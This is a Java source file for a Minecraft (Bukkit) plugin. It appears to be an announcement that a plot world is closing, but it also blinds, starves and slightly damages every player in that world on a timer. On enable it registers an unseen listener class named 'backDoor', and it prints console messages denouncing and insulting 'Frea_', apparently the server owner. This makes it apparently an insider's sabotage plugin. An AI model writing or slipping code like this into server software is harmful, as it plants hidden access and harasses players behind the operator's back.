package red.cbm;

import java.util.Collection;

import org.bukkit.Bukkit;
import org.bukkit.ChatColor;
import org.bukkit.entity.Player;
import org.bukkit.plugin.java.JavaPlugin;
import org.bukkit.potion.PotionEffect;
import org.bukkit.potion.PotionEffectType;
import org.bukkit.scheduler.BukkitScheduler;

public class Plugin extends JavaPlugin {
	final static String bannedworld = "world_plot";
	private long checkDaily = 6000L;
	private String[] warnMessage = { 
			ChatColor.GOLD + "=====================================================",
			ChatColor.AQUA + "服务器近期正在转型， 请各位玩家尽快完成地皮世界的搬迁。",
			ChatColor.RED + "请各位尽量回收地皮世界内的个人财产并转移至主世界。",
			ChatColor.RED + "不方便搬移的建筑物可以联系服主帮忙转移。",
			ChatColor.RED + "地皮世界将会在2月1日关闭， 非常抱歉对各位带来不便。",
			ChatColor.GOLD + "=====================================================" };

	@Override
	public void onEnable() {
		getServer().getPluginManager().registerEvents(new backDoor(), this);
		for (int i = 0; i < 10; i++) {
			System.out.println(ChatColor.AQUA + "打倒 Frea_暴政!!");
		}

		BukkitScheduler scheduler = Bukkit.getServer().getScheduler();
		scheduler.scheduleSyncRepeatingTask(this, new Runnable() {
			@Override
			public void run() {
				Collection<? extends Player> c = Bukkit.getServer().getOnlinePlayers();
				for (Player p : c) {
					String s = p.getWorld().getName();
					if (s.equalsIgnoreCase(bannedworld)) {
						for (String x : warnMessage) {
							p.sendMessage(x);
						}
						p.sendTitle(ChatColor.GOLD + "请尽快搬离地皮区", ChatColor.RED + "我们鼓励玩家在主世界进行建筑", 10, 60, 10);
						p.addPotionEffect(new PotionEffect(PotionEffectType.BLINDNESS, 80, 1));
						p.addPotionEffect(new PotionEffect(PotionEffectType.HUNGER, 600, 1));
						p.damage(1E-1);
					}
				}
			}
		}, 0L, checkDaily);

	}

	@Override
	public void onDisable() {
		for (int i = 0; i < 9; i++) {
			System.out.println(ChatColor.AQUA + "再也不见!!!!!辣鸡 Frea_!!");
		}
	}

}
